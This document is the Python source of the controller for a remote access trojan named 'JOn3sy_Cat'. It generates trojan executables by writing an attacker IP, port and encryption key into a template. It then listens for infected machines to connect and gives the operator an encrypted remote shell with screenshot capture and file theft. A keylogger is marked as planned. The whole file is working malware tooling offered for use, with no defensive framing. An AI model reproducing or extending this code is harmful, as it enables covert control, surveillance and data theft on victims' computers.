import socket
import sys
from cryptography.fernet import Fernet
import struct
import pickle



#### text colours
'text colour codes:'
'red'
CRED = '\033[91m'
'end'
CEND = '\033[0m'
'blue'
CBLU = '\33[96m'
'magenta'
CMAN = '\33[95m'
'yellow'
CYEL = '\33[33m'
'backg'
CGREY = '\33[44m'


#### - SYMMETRIC ENCRYPTION - ####
# Generate Key:
# - Each time a connection is compromised you should generate a new key for exploits
def generate_key():
    key = Fernet.generate_key()
    with open("Jonesy_cat.key", "wb") as key_file:
         key_file.write(key)
    print("New key is saved in 'Jonesy_cat.key' file.")
    print(CYEL + "'" + key.decode() + "'" + CEND)
    menu()

# Read Key:
# - read key from file
def read_key():
    return open("Jonesy_cat.key", "rb").read()


# Encrypt message:
# - read key and encrypt
def encrypt_mess(comm):
    'encode message'
    key = read_key()
    encoded_message = comm.encode()
    'use key to encrypt'
    f = Fernet(key)
    encrypted = f.encrypt(encoded_message)
    return encrypted

# Decrypt data
def decrypt_mess(message):
    key = read_key()
    f = Fernet(key)
    decrypted_mess = f.decrypt(message)
    return decrypted_mess

#read executable code file
def read_code():
    return open("exec_example.py", "rb").read()

#### - GENERAL FUNCTIONS - ####
def banner():
    print("")
    print("")
    print("                             ^B^                                      ^^^^")
    print("                            BBB^.                                    *^^^^")
    print("                          ^%BB^^B                                   ^^^^B^^")
    print("                          ^BBB&^^                                  ^^^^^#^^")
    print("                          BBBB^^^%                                ^^^^^^%B^^B")
    print("                         ^BBBBB^^^^                              ^^^^^%^^^^^")
    print("                         BBBBBB^^^^^                             ^^^^^^^^^^^^")
    print("                         BBBBBB^^^^^B                            B^^^^^^^BBB^")
    print("                         BBBBBB^^^^^^B   BB^^^^^^^^^^^^^^  ^^_BBBB^^^^^^^^B^^")
    print("                         BBBBB^^^^^^^^B^^^B^^^^^^^^^^B^^^^^^^^#%^B%^^B^^^^^B")
    print("                         BBBBBB^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^BBBB^^^^^^^^^")
    print("                          B^BB^^^^^^^^^^^^^^^^^^^^^^^^^^^B^^^^^^^^B^^^^^^^^^")
    print("                          BBBB^B^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^B")
    print("                         BBBBB^^^^^^^^B^^^^^^^^^^^^^^^^^^^^^^^^^^^^B^^^^^^^^^")
    print("                         BBBBB#,^B^^^^BB^^^^^^B^&^^^.B^^B^^^^^_^^^^^^^^^^^^B^")
    print("                         ^BB^_^%^^^^^BB^!^,*^^^^^^^^^^^^^^^B^^>,^B!#^^^^^^^^^")
    print("                           ^&B^B^^^B^.BBB,B^^^B^^^^^^^^^^^B^^*BB^BB^^^^^^^^^")
    print("                          B>BBBBBBBB^B,B^B^&B^^^^^^^^^^^^^B^BBBB^BB^^B^^^^^B")
    print("                          &B^^B^B^BB.B^^^^^BBB^^^^^^^^#^^^BBB^&B^B^^^B^^^^^^")
    print("                           ^B^*^B^BBB^^^B^BBBB^^B^^^^^^^#>BBBBBBBB^^%^^^^^^^")
    print("                           ^^BB^B^^^^^BB^^^^BBB^^^^^^^B^^BBBBB^^^BBB^^^^^^^^")
    print("                          B^^&^BBBB^BB^^^^B^^BBBB^^^^^B^_BBBBBBB^^^BB^^^^^^BB")
    print("                         ^^^^^^B^BB^^!^_^B^^BBBB^^^^^^BBB^^BBBBBB^^^.^^^^^^B^^")
    print("                          B#^B^,^B^^BB^B^%^^^^BB^>^^^BBBB>^B!^^.^^^^^^^B^^^^^^^")
    print("                        B^>^^BBB,BBBB^BBBB^^^^BBBB^^^B*^^^^^BB%^^B^!^^^^^^^^B^^B")
    print("                       ^^BBBBB.BB^B_BBBBBB^^^^^BB!^^BB^^^^^^BBB^BBB^B^^^^^^^^B^B")
    print("                      B^^B^^BB!B!B_^BBBBBB!BB^B%^BB^BBBB^^BBBBBBBB^^^^^^^^^^^B^^B")
    print("                       B.B.^BBBB^^B^BBBB_BBBBB^,BB^B^BB>^^^^*BBBBBBB&B^^^^^^^^^B^^")
    print("                      ^B^B^BBBB^^.BBBBBB^^^BB*BB&^.^BB!B^^^B^!BBBBBB^^^^^^^^^BBBBB")
    print("                     BBBB^BBBB^^^BBBBB^,BB^^#BBB_^^,BB^^^^BBB&^BB!B^^^^^^^^^^^B&*")
    print("                     B^BBB^B^BBB^^^BB^^^B^^^^B#BB^^BBB^^^^,B^^BB^^%BB^^^^B^^BBB^.^")
    print("                      B>!BB^.^^^^^BBBB^^^B^^^BBBB,^BBB^^^^BB^^^B^.^^^^^^^^^^^^^^B")
    print("                     ^^B&B^^^^^^&BB^%^B^^^^^>B,BBBBBB_^^BB^^^^^^BBB^^^^B^^^^B^BB^")
    print("                    BBB^BBB.B#B^BB^BB^B^^^^^^^B!BBBBBB^^^B^^^^^^^B^B^_^^^^^^^^B^^^")
    print("                     B^BBBB^BBBBBBBB^BBB^^^^^^B^BBBBB^^^^B^^^^^BB^BB^^B^^^^^^B^B^")
    print("                       >BBBBB^^B.B^BBBBBBBB^BB^^^BBBBBB^^B^^B^BBBB^B^B>^^^^^^^!BB_^")
    print("                       BB^^BB^^^B!BBB,^BBB^BB^BB^^BBBB_^^B^^^^^B^BBBB^^^^^B^^^BB^^^")
    print("                       B^BBBB^^^BB^!*BBB^&B^BBB^B^^BB^^^BB^^B^#^^^^^^^^^^^^^^^^^B^")
    print("                      B^^B^^BB^^^^BBB^B^BBBBBBB^B^BBBB^^BBBB_B^^^^^^^^^^^^^^^BB^B")
    print("                       BBB^BBBBB^^^B^^BBBBB^BBB^B^.%^B^^BBBB^B^^^^^^^^^^^^^^^^^B^")
    print("                       BBBB^BBBB^^^^BBBB^^^BBBB^BBBBB^^BBBB.B^!B^^^^^^^^^^^^^^^B")
    print("                          BBBBBBB^^^^&^^^BBBBBBBB^^^^B^BBBBB^B%^B*^^^^^^^^^^^^B^")
    print("                         ^BB_B^BB^BB^BBBBBBBBBB^^^^^^^BBBBBBBBB&^^^^^^^^^^^^^^^")
    print("                          ^BBB^BBBBBB.BBBBBBBBBBB^^^^^BBBBBBBBBBB^^^B^^^^^^^^B")
    print("                          ^BB^^BBBBBB^B^^BBBBBBBBB^^^BBBBBBBBBB^^^^B,^^^^^^^^")
    print("                           ^BB^^B^BBBBBBB^^BBBBBBB^^BBBBBBBBB^^^^B^B^^^^^^^^B")
    print("                            ^BBB!BB%BBBBBBBB^^^^^^BB^^BBBBB^^^BB^BB^^^^^^^^B")
    print("                              ^B&BBB^B^BBBBBBB^^B^,BBBB^B^^^^BBB%^^^^^^_B^^")
    print("                               BBBBB^^_BBBBBBBB^^^^^^^^B^%BBBB^B^^^^^^^^*^")
    print("                                 BBBBBBBBBBBBBBBBBBBB#BBBBB#^^B^^^^^^,^^^")
    print("                                   ^.B^^BBBB^BBBBBBBBBBBBBB^^^&*BBB^^^,^")
    print("                                      B^BBBB^B^BBBBBBB%BBB^^.BB.B^^B")
    print("                                       BB^BBB^B^BBBBB^^^^&BB^^&^")
    print("                                           B,*B^^^B^>B..BB.^B")
    header()


def header():
    print("")
    print("")
    print(CRED + "     ::::::::::: :::::::  ::::    ::: :::::::::: ::::::::  :::   :::          ::::::::      ::: ::::::::::: " + CEND)
    print(CRED + "        :+:    :+:   :+: :+:+:   :+: :+:       :+:    :+: :+:   :+:         :+:    :+:   :+: :+:   :+:      " + CEND)
    print(CRED + "       +:+    +:+   +:+ :+:+:+  +:+ +:+       +:+         +:+ +:+          +:+         +:+   +:+  +:+       " + CEND)
    print(CRED + "      +#+    +#+   +:+ +#+ +:+ +#+ +#++:++#  +#++:++#++   +#++:           +#+        +#++:++#++: +#+        " + CEND)
    print(CRED + "     +#+    +#+   +#+ +#+  +#+#+# +#+              +#+    +#+            +#+        +#+     +#+ +#+         " + CEND)
    print(CRED + "#+# #+#    #+#   #+# #+#   #+#+# #+#       #+#    #+#    #+#            #+#    #+# #+#     #+# #+#          " + CEND)
    print(CRED + " #####      #######  ###    #### ########## ########     ###             ########  ###     ### ###          " + CEND)
    print("------------------------------------------------JOn3sy_Cat v1.0----------------------------------------------------")
    menu()

# Menu options
def menu():
    print("\n")
    print("---Menu---")
    print("1." + CYEL + " Generate Encryption Key" + CEND)
    print("2." + CYEL + " Create Exploit" + CEND)
    print("3." + CYEL + " Connect to Target" + CEND)
    print("type 'exit' to exit")
    select = input(">>>: ")
    if select == "3":
        find_Server()
    elif select == "2":
        print(CRED + "[!] UNDER CONSTRUCTION" + CEND)
        create_exploit()
    elif select == "1":
        generate_key()
    elif select == "exit":
        print(CRED + "[!] Shutting Down" + CEND)
        sys.exit()
    else:
        print(CRED + "[!] Bad Input" + CEND)


# Connect to Server
def find_Server():
    'initialise socket'
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("\n")
    print(">>> Connecting to Target")
    print(CBLU + "[+] Server On" + CEND)

    '#### Enter you local IP and port ####'
    ss.bind(('192.168.1.6', 8888))
    ss.listen(5)
    print(CBLU + "[+] LISTENING..." + CEND)
    (clientsocket, address) = ss.accept()
    print(CBLU + "[+] Target CONNECTED!" + CEND)
    print(CBLU + "[+] @ " + str(address) + CEND)
    backdoor(clientsocket, ss)

'current working on!'
# Create exploit file
def create_exploit():
    print(CBLU + "\n[+] Creating RAT Executable" + CEND)
    print("Please Enter Your designated machine details.")
    ip = input(">>> IP address: ")
    port = input(">>> Destination port : ")
    name = input("enter file name: ")
    name = name + ".py"
    current_key = read_key()
    code = read_code()
    with open(name, "wb") as f:
        f.write(code)
    # read the new file lines
    with open(name, "r") as f:
       get_all = f.readlines()
    # write inputs to new file.
    with open(name, "w") as f:
        for i, line in enumerate(get_all, 1):
            if i == 14:
                f.writelines("    key = " + str(current_key) + "\n")
            elif i == 57:
                f.writelines("      ip =" + "'" + ip + "'" + "\n")
            elif i == 58:
                f.writelines("      port = " + port + "\n")
            else:
                f.writelines(line)
    print(CBLU + "[+] Writing Executable..." + CEND)
    print("File Saved")
    menu()

### screen shot function ###
# handle image as packets
def receive_image(conn):
    data_size = struct.unpack('>I', conn.recv(4))[0]
    received_payload = b""
    remaining_payload_size = int(data_size)
    while remaining_payload_size > 0:
        received_payload += conn.recv(remaining_payload_size)
        remaining_payload_size = data_size - len(received_payload)
    data = pickle.loads(received_payload)
    print(data)
    return data

#### - BACKDOOR FUNCTIONS - ####
# Communicate via backdoor
def backdoor(client, ss):
    print("\n")
    while True:
        shell = input(CRED + "Shell>>>" + CEND)
        if shell == "exit":
            print(CBLU + "[+] Closing connection!\n" + CEND)
            client.close()
            ss.close()
            menu()
        elif shell == "help":
            print("\n#####################################")
            print("You've entered the targets computer..")
            print("You have a few options: ")
            print("'exit'  - to close connection")
            print("'screen_grab' - to screenshot target")
            print("'_keylogr' - to initiate keylogger")
            print("'<filename>_grabr - to download a file")
            print("\nOtherwise all directory commands remain the same.")
            print("Goodluck!")
            print("- JC\n")
            print("#####################################\n")
        elif shell == "screen_grab":
            message = encrypt_mess(shell)
            # print(message)
            client.sendall(message)
            data = receive_image(client)
            img = "screen_grab.png"
            data.save(img)
        else:
            message = encrypt_mess(shell)
            #print(message)
            client.sendall(message)
            #receive data
            data = client.recv(4096)
            #decrypt data
            rcv_message = decrypt_mess(data)
            #print message decoded
            print(CYEL + rcv_message.decode() + CEND)

'currently working on!'
# initiate keylogger
def key_logger():
    return


banner()